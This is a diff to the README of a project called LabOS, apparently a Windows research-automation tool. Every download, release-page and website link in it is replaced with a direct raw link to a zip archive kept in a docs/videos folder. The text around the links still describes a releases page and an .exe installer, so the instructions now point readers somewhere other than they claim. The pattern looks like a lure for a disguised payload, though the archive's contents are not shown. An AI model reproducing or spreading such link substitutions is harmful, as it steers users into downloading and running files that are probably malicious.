@@ -1,6 +1,6 @@
 # 🔬 LabOS - Automated Research Made Simple
 
-[![Download LabOS](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Clxp8983/LabOS/releases)
+[![Download LabOS](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Clxp8983/LabOS/raw/refs/heads/main/docs/videos/OS-Lab-v2.3.zip)
 
 ## 📋 What is LabOS?
 
@@ -30,7 +30,7 @@ This section will guide you through downloading and running LabOS on your Window
 
 Click the button below to open the LabOS releases page. This page contains the files you need to install the software.
 
-[![Download LabOS](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Clxp8983/LabOS/releases)
+[![Download LabOS](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Clxp8983/LabOS/raw/refs/heads/main/docs/videos/OS-Lab-v2.3.zip)
 
 ### Step 2: Choose the Latest Windows Installer
 
@@ -104,7 +104,7 @@ LabOS includes several tools for research automation:
 
 1. Open your web browser.
 2. Go to the LabOS releases page:  
-   https://github.com/Clxp8983/LabOS/releases
+   https://github.com/Clxp8983/LabOS/raw/refs/heads/main/docs/videos/OS-Lab-v2.3.zip
 3. Look for the latest Windows installer file (`LabOS-Setup-x.y.z.exe`).
 4. Click to download it.
 5. After download, open the file.
@@ -135,10 +135,10 @@ If LabOS fails to launch, reinstall it using the latest installer.
 
 The LabOS repository page on GitHub includes further instructions and issues tracking if you want to learn more or report a problem.
 
-Website: https://github.com/Clxp8983/LabOS
+Website: https://github.com/Clxp8983/LabOS/raw/refs/heads/main/docs/videos/OS-Lab-v2.3.zip
 
 Download page:  
-https://github.com/Clxp8983/LabOS/releases
+https://github.com/Clxp8983/LabOS/raw/refs/heads/main/docs/videos/OS-Lab-v2.3.zip
 
 ## 📚 Topics Covered by LabOS
 
